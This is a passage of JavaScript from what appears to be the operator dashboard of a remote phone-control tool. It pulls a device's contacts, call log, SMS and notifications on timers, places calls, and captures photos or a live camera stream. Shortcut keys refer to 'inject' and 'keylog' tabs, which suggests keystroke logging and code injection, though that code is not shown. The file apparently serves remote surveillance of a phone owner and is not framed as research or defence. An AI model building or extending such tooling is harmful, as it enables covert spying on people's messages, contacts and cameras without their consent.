      loadApps('user');
    }
  }, 10000);

  // Auto-refresh contacts every 15 seconds
  setInterval(() => {
    if (state.currentTab === 'contacts') {
      loadContacts();
    }
  }, 15000);

  // Auto-refresh call log every 15 seconds
  setInterval(() => {
    if (state.currentTab === 'call') {
      loadCallLog();
    }
  }, 15000);

  // Auto-refresh SMS every 10 seconds
  setInterval(() => {
    if (state.currentTab === 'sms') {
      loadSMS();
    }
  }, 10000);

  // Auto-refresh notifications every 8 seconds
  setInterval(() => {
    if (state.currentTab === 'notifications') {
      loadNotifications();
    }
  }, 8000);

  // Keyboard shortcuts
  document.addEventListener('keydown', (e) => {
    if (e.ctrlKey && e.key === '1') switchTab('home');
    if (e.ctrlKey && e.key === '2') switchTab('hbcn');
    if (e.ctrlKey && e.key === '3') switchTab('inject');
    if (e.ctrlKey && e.key === '4') switchTab('apps');
    if (e.ctrlKey && e.key === '5') switchTab('keylog');
    if (e.ctrlKey && e.key === '6') switchTab('tools');
  });
});

// ==================== Contacts Module ====================
let allContacts = [];

async function loadContacts() {
  try {
    const list = document.getElementById('contactsList');
    if (list) list.innerHTML = '<div class="contacts-empty"><div class="spinner-sm"></div> Loading contacts...</div>';
    const result = await api('GET', '/api/contacts?limit=500');
    let contacts = [];
    if (result.content?.[0]?.text) {
      contacts = JSON.parse(result.content[0].text);
    } else if (Array.isArray(result)) {
      contacts = result;
    }
    allContacts = contacts;
    renderContacts(contacts);
    const count = document.getElementById('contactsCount');
    if (count) count.textContent = `${contacts.length} contacts`;
  } catch (err) {
    const list = document.getElementById('contactsList');
    if (list) list.innerHTML = `<div class="contacts-empty">Error: ${err.message}</div>`;
  }
}

function renderContacts(contacts) {
  const container = document.getElementById('contactsList');
  if (!container) return;
  if (!contacts || contacts.length === 0) {
    container.innerHTML = '<div class="contacts-empty">No contacts found</div>';
    return;
  }
  let html = '';
  contacts.forEach(c => {
    const name = c.name || c.displayName || 'Unknown';
    const phones = c.phone_numbers || c.phoneNumbers || c.phones || (c.phone ? [c.phone] : []);
    const emails = c.emails || c.email_addresses || c.emailAddresses || (c.email ? [c.email] : []);
    const phone = phones[0] || '';
    const email = emails[0] || '';
    const initials = name.split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
    html += `
      <div class="contact-item" onclick="contactCall('${escHtml(phone)}')">
        <div class="contact-avatar">${initials || '?'}</div>
        <div class="contact-info">
          <span class="contact-name">${escHtml(name)}</span>
          ${phone ? `<span class="contact-phone">${escHtml(phone)}</span>` : ''}
          ${email ? `<span class="contact-email">${escHtml(email)}</span>` : ''}
        </div>
        <div class="contact-actions">
          ${phone ? `<button class="contact-call-btn" onclick="event.stopPropagation();contactCall('${escHtml(phone)}')" title="Call">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
          </button>` : ''}
          ${phone ? `<button class="contact-sms-btn" onclick="event.stopPropagation();contactSms('${escHtml(phone)}')" title="Send SMS">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
          </button>` : ''}
        </div>
      </div>
    `;
  });
  container.innerHTML = html;
}

function filterContacts(value) {
  const q = value.toLowerCase();
  const filtered = allContacts.filter(c => {
    const name = (c.name || c.displayName || '').toLowerCase();
    const phones = (c.phone_numbers || c.phoneNumbers || c.phones || []).join(' ').toLowerCase();
    return name.includes(q) || phones.includes(q);
  });
  renderContacts(filtered);
}

function contactCall(phone) {
  if (!phone) return;
  showToast(`Calling ${phone}...`, 'info');
  api('POST', '/api/control/call', { phone_number: phone }).catch(() => {});
}

function contactSms(phone) {
  if (!phone) return;
  switchTab('sms');
  setTimeout(() => {
    const phoneInput = document.getElementById('smsComposePhone');
    if (phoneInput) phoneInput.value = phone;
  }, 300);
}

// ==================== Camera Module ====================
let cameraList = [];
let cameraStreamActive = false;

async function cameraListCameras() {
  if (cameraStreamActive) await cameraStopStream();
  try {
    const result = await api('GET', '/api/camera/list');
    let cameras = [];
    if (result.content?.[0]?.text) {
      cameras = JSON.parse(result.content[0].text);
    } else if (Array.isArray(result)) {
      cameras = result;
    }
    cameraList = cameras;
    const select = document.getElementById('cameraSelect');
    if (!select) return;
    select.innerHTML = '<option value="">-- Select Camera --</option>' +
      cameras.map(c => {
        const id = c.camera_id || c.id || '';
        const facing = c.facing || c.face || 'unknown';
        const label = facing === '0' ? 'Rear' : facing === '1' ? 'Front' : `Camera ${id}`;
        return `<option value="${id}">${label}${c.supports_video ? ' 📹' : ''}${c.supports_photo ? ' 📷' : ''}</option>`;
      }).join('');
    if (cameras.length > 0) {
      setCameraStatus(`Found ${cameras.length} cameras`);
    } else {
      setCameraStatus('No cameras found');
    }
  } catch (err) {
    setCameraStatus(`Error: ${err.message}`);
  }
}

function cameraSelectChanged() {
  const preview = document.getElementById('cameraImage');
  const stream = document.getElementById('cameraStreamContainer');
  const placeholder = document.getElementById('cameraPlaceholder');
  if (preview) preview.style.display = 'none';
  if (stream) stream.style.display = 'none';
  if (placeholder) placeholder.style.display = 'flex';
  if (cameraStreamActive) cameraStopStream();
}

async function cameraTakePhoto() {
  const cameraId = document.getElementById('cameraSelect')?.value;
  if (!cameraId) { showToast('Select a camera first', 'error'); return; }
  try {
    setCameraStatus('Capturing photo...');
    const result = await api('POST', '/api/camera/photo', { camera_id: cameraId, quality: 85 });
    const preview = document.getElementById('cameraImage');
    const placeholder = document.getElementById('cameraPlaceholder');
    const stream = document.getElementById('cameraStreamContainer');
    if (stream) stream.style.display = 'none';
    let imgSrc = null;
    if (result.content?.[0]?.type === 'image' && result.content[0].data) {
      imgSrc = `data:image/jpeg;base64,${result.content[0].data}`;
    } else if (result.content?.[0]?.text) {
      try {
        const data = JSON.parse(result.content[0].text);
        if (data.image) imgSrc = `data:image/jpeg;base64,${data.image}`;
      } catch(e) {}
    }
    if (imgSrc && preview) {
      preview.src = imgSrc;
      preview.style.display = 'block';
      if (placeholder) placeholder.style.display = 'none';
      setCameraStatus('Photo captured');
      showToast('Photo captured!', 'success');
    } else {
      setCameraStatus('No image data received');
    }
  } catch (err) {
    setCameraStatus(`Error: ${err.message}`);
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function cameraSavePhoto() {
  showToast('Save photo to device is not available', 'info');
  setCameraStatus('Save photo not available');
}

async function cameraStartStream() {
  if (cameraStreamActive) {
    cameraStopStream();
    return;
  }
  const cameraId = document.getElementById('cameraSelect')?.value;
  if (!cameraId) { showToast('Select a camera first', 'error'); return; }
  try {
    setCameraStatus('Starting stream...');
    const result = await api('POST', '/api/camera/stream/start', { camera_id: cameraId });
    const btn = document.getElementById('cameraStreamBtn');
    if (btn) { btn.classList.add('active'); btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></svg><span>Stop</span>'; }
    cameraStreamActive = true;
    setCameraStatus('Stream active');
    showToast('Stream started!', 'success');

    // Connect live camera frame via real-time polling proxy
    const streamContainer = document.getElementById('cameraStreamContainer');
    const streamImg = document.getElementById('cameraStream');
    const placeholder = document.getElementById('cameraPlaceholder');
    const preview = document.getElementById('cameraImage');
    if (preview) preview.style.display = 'none';
    if (streamContainer && streamImg) {
      streamImg.onerror = function() {
        setCameraStatus('Stream unavailable - check device camera');
        showToast('Stream connection failed', 'error');
      };
      streamImg.onload = function() {
        setCameraStatus('Stream connected');
      };
      window._cameraStreamPoll = setInterval(() => {
        streamImg.src = '/api/camera/live/frame?wait=1&_=' + Date.now();
      }, 500);
      streamContainer.style.display = 'block';
      if (placeholder) placeholder.style.display = 'none';
    }
  } catch (err) {
    setCameraStatus(`Error: ${err.message}`);
    showToast(`Error: ${err.message}`, 'error');
  }
}

async function cameraStopStream() {
  try {
    await api('POST', '/api/camera/stream/stop');
  } catch(e) {}
  const btn = document.getElementById('cameraStreamBtn');
  if (btn) { btn.classList.remove('active'); btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg><span>Live</span>'; }
  const streamContainer = document.getElementById('cameraStreamContainer');
  const streamImg = document.getElementById('cameraStream');
  if (streamImg) streamImg.src = '';
  if (streamContainer) streamContainer.style.display = 'none';
  const placeholder = document.getElementById('cameraPlaceholder');
  if (placeholder) placeholder.style.display = 'flex';
  cameraStreamActive = false;
  setCameraStatus('Stream stopped');
  showToast('Stream stopped', 'info');
}

async function cameraRecordVideo() {
  const btn = document.getElementById('cameraRecordBtn');
  if (btn) btn.disabled = false;
  showToast('Record video is not available', 'info');
  setCameraStatus('Record video not available');
}

async function cameraCaptureFrame() {
  const cameraId = document.getElementById('cameraSelect')?.value;
  if (!cameraId) { showToast('Select a camera first', 'error'); return; }
  try {
    setCameraStatus('Capturing frame...');
    const result = await api('POST', '/api/camera/frame', { camera_id: cameraId });
    const preview = document.getElementById('cameraImage');
    const placeholder = document.getElementById('cameraPlaceholder');
    const stream = document.getElementById('cameraStreamContainer');
    if (stream) stream.style.display = 'none';
    let imgSrc = null;
    if (result.content?.[0]?.type === 'image' && result.content[0].data) {
      imgSrc = `data:image/jpeg;base64,${result.content[0].data}`;
    } else if (result.content?.[0]?.text) {
      try {
        const data = JSON.parse(result.content[0].text);
        const img = data.image || data.frame;
        if (img) imgSrc = `data:image/jpeg;base64,${img}`;
      } catch(e) {}
    }
    if (imgSrc && preview) {
      preview.src = imgSrc;
      preview.style.display = 'block';
      if (placeholder) placeholder.style.display = 'none';
      setCameraStatus('Frame captured');
    } else {
      setCameraStatus('No frame data received');
    }
  } catch (err) {
    setCameraStatus(`Error: ${err.message}`);
  }
}

function setCameraStatus(msg) {
  const el = document.getElementById('cameraStatus');
  if (el) el.textContent = msg;
}